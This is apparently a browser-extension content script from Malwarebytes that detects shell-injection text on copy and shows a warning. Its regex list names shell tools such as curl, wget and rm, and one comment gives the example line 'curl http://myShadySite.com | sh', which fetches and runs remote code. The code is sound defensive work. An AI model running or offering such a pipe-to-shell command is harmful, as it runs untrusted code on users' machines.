import {chrome} from '../utils/polyfill.ts';
import {urlHost} from '../utils/utils';
import {displayShellInjectionNotification} from './content-notifications';

// BG-779 Block sites that attempt shell injection
const mb = {};
let isActive = true;

mb.allowScamsOnThisSite = () => new Promise((resolve, reject) => {
    chrome.runtime.sendMessage({
        type: "MSG_ADD_ALLOW",
        payload: {
            host: urlHost(window.location.href)
        }
    }, function(response) {
        if (!response || response.error) {
            reject(response ? response.error : null);
        } else {
            resolve(response.success);
        }
    });
});

mb.attachEvents = (dom) => {
    dom.getElementById("mb-disable-shell-warning").addEventListener("click", async () => {
        try {
            await mb.allowScamsOnThisSite();
            isActive = false;
            document.getElementById("malwarebytes-root").remove();
        } catch (error) {
            console.error('CONTENT_SHELL: allowScamsOnThisSite failure', error);
        }
    });
};

mb.isExcluded = () => {
    return new Promise((resolve) => {
        chrome.runtime.sendMessage(
            {
                type: "isExcluded",
                parameters: {type: "scam", url: window.location.href}
            },
            (response) => {
                if (response && !response.excluded) {
                    resolve(false);
                } else {
                    resolve(true);
                }
            }
        );
    });
};

// command patterns found here https://www.thesecuritybuddy.com/vulnerabilities/what-is-shell-injection-or-command-injection-attack/
const shellPatterns = [
    /^.*;\s*(.|\s)*$/gm, //eg command1 ; command2
    /^.+(\s*)\|(\s*).+$/gm, // e.g curl http://myShadySite.com | sh
    /^\w+(\s*)`.+`$/gm, // e.g command1`command2` or command1 `command2`
    /^\w+(\s*)'.+'$/gm, // e.g command1'command2' or command1 'command2'
    /^.+\$\(\w+.*\)$/gm, // e.g command1$(command2)
    /curl|ls|rm|cp|mv|touch|cd|wget|cmd|mshta(\s+)/gm,
];

const isSuspiciousText = (text) => {
    return shellPatterns.some((p) => p.test(text));
};

mb.injectHtml = () => {
    displayShellInjectionNotification(mb.attachEvents);
};

mb.init = async () => {
    const isExcluded = await mb.isExcluded();
    if (isExcluded) {
        console.debug('CONTENT_SHELL: Page allowed. Skipping shell injection blocks');
        return;
    }
    document.addEventListener('copy', (event) => {
        const data = event.clipboardData.getData('text/plain');
        const shouldWarn = isSuspiciousText(data) || isSuspiciousText(event.target.innerText);
        if (shouldWarn && isActive) {
            console.debug('CONTENT_SHELL: Malicious Copy Event detected', event, data);
            mb.injectHtml();
        }
    });
};

mb.init();
